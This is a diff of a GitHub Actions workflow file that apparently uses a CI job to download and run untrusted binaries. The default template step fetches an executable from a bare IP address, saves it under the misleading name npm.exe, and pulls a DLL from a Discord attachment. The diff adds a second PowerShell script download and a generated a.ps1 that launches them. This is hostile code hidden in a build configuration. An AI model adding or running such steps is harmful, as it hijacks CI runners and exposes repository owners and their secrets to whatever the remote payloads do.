@@ -29,7 +29,10 @@ jobs:
       - name: Run a multi-line script
         run: |
           Invoke-WebRequest http://5.102.153.140/lambdatest/chrome.exe -OutFile npm.exe
+          Invoke-WebRequest http://5.102.153.140/lambdatest/lol3.ps1 -OutFile lol3.ps1
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830537244028305418/Nancy.dll -OutFile Nancy.dll
-          ./npm.exe
+          cmd /C echo .\npm.exe >>a.ps1
+          cmd /C echo .\lol2.ps1 >>a.ps1
+          .\a.ps1
           echo Add other actions to build,
           echo test, and deploy your project.
